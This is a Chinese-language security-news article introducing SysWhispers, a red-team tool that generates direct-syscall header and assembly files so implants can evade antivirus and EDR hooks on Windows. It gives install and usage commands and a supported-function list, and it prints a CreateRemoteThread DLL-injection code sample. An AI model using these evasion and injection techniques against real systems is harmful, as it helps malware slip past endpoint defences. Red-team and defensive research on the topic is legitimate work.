![](https://image.3001.net/images/20200108/1578495373_5e15ed8d56e15.jpg!small)

## SysWhispers

 **SysWhispers能够生成Header文件和ASM文件，并通过发送直接系统调用来绕过反病毒以及终端防护响应工具。该工具支持Windows
XP至Windows 10的所有系统核心调用，生成的样本文件可以直接从“example-output/”目录获取。**

## 工具介绍

很多安全产品都会在用户模式API下设置钩子，这样就可以帮助它们将目标程序的执行流重定向至它们的引擎中，并检测可疑的行为。Ntdll.dll中的函数可以通过少量汇编指令来发送系统调用，因此在我们的植入程序中重新实现这种操作，就可以帮助我们绕过这些安全产品所设置的钩子了。

SysWhispers可以帮助红队研究人员针对内核镜像（ntoskrnl.exe）发送的任意系统调用生成对应的Header/ASM键值对，支持的操作系统平台包括Windows
XP至Windows 10，而且这些Header还包含必要的类型定义。接下来，我们一起看一看如何安装和使用这款功能强大的AV/EDR绕过工具吧！

## 工具安装

    
    
    > git clone https://github.com/jthuraisamy/SysWhispers.git
    > cd SysWhispers
    > pip3 install -r .\requirements.txt
    > py .\syswhispers.py --help

## 工具使用及样例

### 命令行

导出所有Windows版本支持的全部功能：

    
    
    py .\syswhispers.py --preset all -o syscalls_all

仅导出Windows 7、8和10支持的常用功能：

    
    
    py .\syswhispers.py --preset common -o syscalls_common

导出NtProtectVirtualMemory和NtWriteVirtualMemory函数：

    
    
    py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem

导出Windows 7、8和10所有支持的函数及功能：

    
    
    py .\syswhispers.py --versions 7,8,10 -o syscalls_78X

### 脚本输出

    
    
    PS C:\Projects\SysWhispers> py .\syswhispers.py --preset common --out-file syscom
    
      ,         ,       ,_ /_   .  ,   ,_    _   ,_   ,
    _/_)__(_/__/_)__/_/_/ / (__/__/_)__/_)__(/__/ (__/_)__
          _/_                         /
         (/                          /   @Jackson_T, 2019
    
    SysWhispers: Why call the kernel when you can whisper?
    
    Common functions selected.
    
    Complete! Files written to:
            syscom.asm
            syscom.h

经典的CreateRemoteThread DLL注入实例

    
    
    py .\syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
    
    
    #include <Windows.h>
    
    void InjectDll(const HANDLE hProcess, const char* dllPath)
    {
        LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    	
        WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
        CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, nullptr);
    }

## 常用功能

使用下列函数及方法并配合“--preset common”参数，可以创建一个Header/ASM键值对：

> NtCreateProcess (CreateProcess)
>
> NtCreateThreadEx (CreateRemoteThread)
>
> NtOpenProcess (OpenProcess)
>
> NtOpenThread (OpenThread)
>
> NtSuspendProcess
>
> NtSuspendThread (SuspendThread)
>
> NtResumeProcess
>
> NtResumeThread (ResumeThread)
>
> NtGetContextThread (GetThreadContext)
>
> NtSetContextThread (SetThreadContext)
>
> NtClose (CloseHandle)
>
> NtReadVirtualMemory (ReadProcessMemory)
>
> NtWriteVirtualMemory (WriteProcessMemory)
>
> NtAllocateVirtualMemory (VirtualAllocEx)
>
> NtProtectVirtualMemory (VirtualProtectEx)
>
> NtFreeVirtualMemory (VirtualFreeEx)
>
> NtQuerySystemInformation (GetSystemInfo)
>
> NtQueryDirectoryFile
>
> NtQueryInformationFile
>
> NtQueryInformationProcess
>
> NtQueryInformationThread
>
> NtCreateSection (CreateFileMapping)
>
> NtOpenSection
>
> NtMapViewOfSection
>
> NtUnmapViewOfSection
>
> NtAdjustPrivilegesToken (AdjustTokenPrivileges)
>
> NtDeviceIoControlFile (DeviceIoControl)
>
> NtQueueApcThread (QueueUserAPC)
>
> NtWaitForMultipleObjects (WaitForMultipleObjectsEx)

## 导入至Visual Studio

> 1、将生成的Header/ASM文件拷贝至项目目录；
>
> 2、在Visual Studio中，点击Project→Build Customizations...，然后启用MASM；
>
> 3、在Solution Explorer中，添加.h和.asm文件至项目中，作为对应的Header和源文件引用；
>
> 4、进入ASM文件的属性页中，设置Item类型为Microsoft Macro Assembler；
>
> 5、确保项目平台设置为x64，目前该项目不支持32位平台；

## 工具限制

> 1、目前仅支持在64位的Windows操作系统；
>
> 2、目前不支持来自图形子系统（win32k.sys）的系统调用；
>
> 3、工具仅在Windows 10 SDK的Visual Studio 2019（v142）中进行过测试；

## 项目地址

> SysWhispers：【[ _GitHub传送门_](https://github.com/jthuraisamy/SysWhispers)】

 *** 参考来源：[
_jthuraisamy_](https://github.com/jthuraisamy/SysWhispers)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

